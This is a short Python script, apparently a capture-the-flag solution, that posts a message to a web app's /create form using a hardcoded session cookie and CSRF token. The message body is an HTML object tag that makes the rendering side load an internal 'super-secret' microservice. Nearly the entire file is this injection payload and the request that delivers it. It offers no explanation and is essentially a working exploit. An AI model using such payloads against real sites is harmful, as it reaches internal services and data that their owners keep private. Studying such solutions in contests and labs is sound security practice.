import requests

content = """
    <object data="http://zad41-mimuw-finals-2023-super-secret-microservice/index.html" width="120%"></object>
"""

data = {
    "csrfmiddlewaretoken": "FxuiAv6mvJLrctLjwkl1uqmgPd9F2cR1RwIYSSqcn2FhhM94hezNTlqzoPBWhhZo",
    "recipient": "wulux",
    "content": content,
    "template": "normal",
}


headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "csrftoken=m9oQsxu02t40ftyVV4oWz5etJMCrpfix; sessionid=0v9ksmxzoc19g5c0z6hf2z0z6bzhq12t",
    "Origin": "https://web.kazet.cc:42448",
    "Referer": "https://web.kazet.cc:42448/create",
}

url = "https://web.kazet.cc:42448/create"

requests.post(url, data=data, headers=headers)
print("Sent!")
